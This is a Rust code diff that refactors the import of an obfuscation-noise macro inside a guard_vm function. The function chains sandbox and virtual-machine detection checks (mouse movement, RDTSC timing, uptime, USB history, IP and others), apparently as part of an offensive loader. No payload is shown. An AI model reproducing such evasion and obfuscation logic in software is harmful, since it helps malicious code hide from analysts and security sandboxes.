@@ -18,6 +18,8 @@ mod api_flood;
 mod c_drive;
 #[cfg(feature = "vm_check_uptime")]
 mod uptime;
+
+use rsl_macros::obfuscation_noise_macro;
 #[cfg(feature = "vm_check_usb_mount")]
 mod usb_mount;
 #[cfg(feature = "vm_check_cpu_info")]
@@ -37,7 +39,7 @@ pub fn guard_vm() -> bool {
         else {
             #[cfg(feature = "debug")]
             print_message("C: drive size check passed.");
-            rsl::obfuscation_noise_macro!();
+            obfuscation_noise_macro!();
         }
     }
 
@@ -48,7 +50,7 @@ pub fn guard_vm() -> bool {
         else {
             #[cfg(feature = "debug")]
             print_message("Desktop files check passed.");
-            rsl::obfuscation_noise_macro!();
+            obfuscation_noise_macro!();
         }
     }
 
@@ -57,7 +59,7 @@ pub fn guard_vm() -> bool {
     else {
         #[cfg(feature = "debug")]
         print_message("Tick check passed.");
-        rsl::obfuscation_noise_macro!();
+        obfuscation_noise_macro!();
     }
     
     #[cfg(feature = "vm_check_api_flood")]
@@ -68,7 +70,7 @@ pub fn guard_vm() -> bool {
         else {
             #[cfg(feature = "debug")]
             print_message("API flood check passed.");
-            rsl::obfuscation_noise_macro!();
+            obfuscation_noise_macro!();
         }
     }
 
@@ -77,7 +79,7 @@ pub fn guard_vm() -> bool {
     else {
         #[cfg(feature = "debug")]
         print_message("Mouse movement check passed.");
-        rsl::obfuscation_noise_macro!();
+        obfuscation_noise_macro!();
     }
 
     #[cfg(feature = "vm_check_uptime")]
@@ -87,7 +89,7 @@ pub fn guard_vm() -> bool {
         else {
             #[cfg(feature = "debug")]
             print_message("System uptime check passed.");
-            rsl::obfuscation_noise_macro!();
+            obfuscation_noise_macro!();
         }
     }
 
@@ -96,7 +98,7 @@ pub fn guard_vm() -> bool {
     else {
         #[cfg(feature = "debug")]
         print_message("USB mount history check passed.");
-        rsl::obfuscation_noise_macro!();
+        obfuscation_noise_macro!();
     }
 
     
@@ -107,7 +109,7 @@ pub fn guard_vm() -> bool {
         else {
             #[cfg(feature = "debug")]
             print_message("CPU info check passed.");
-            rsl::obfuscation_noise_macro!();
+            obfuscation_noise_macro!();
         }
     }
 
@@ -119,7 +121,7 @@ pub fn guard_vm() -> bool {
         else {
             #[cfg(feature = "debug")]
             print_message("RDTSC timing check passed.");
-            rsl::obfuscation_noise_macro!();
+            obfuscation_noise_macro!();
         }
     }
 
@@ -128,7 +130,7 @@ pub fn guard_vm() -> bool {
     else {
         #[cfg(feature = "debug")]
         print_message("Prime number check passed.");
-        rsl::obfuscation_noise_macro!();
+        obfuscation_noise_macro!();
     }
 
     #[cfg(feature = "vm_check_edge")]
@@ -136,7 +138,7 @@ pub fn guard_vm() -> bool {
     else {
         #[cfg(feature = "debug")]
         print_message("Microsoft Edge check passed.");
-        rsl::obfuscation_noise_macro!();
+        obfuscation_noise_macro!();
     }
 
     #[cfg(feature = "vm_check_time")]
@@ -144,7 +146,7 @@ pub fn guard_vm() -> bool {
     else {
         #[cfg(feature = "debug")]
         print_message("System time check passed.");
-        rsl::obfuscation_noise_macro!();
+        obfuscation_noise_macro!();
     }
 
     #[cfg(feature = "vm_check_ip")]
@@ -152,7 +154,7 @@ pub fn guard_vm() -> bool {
     else {
         #[cfg(feature = "debug")]
         print_message("IP address check passed.");
-        rsl::obfuscation_noise_macro!();
+        obfuscation_noise_macro!();
     }
 
     false
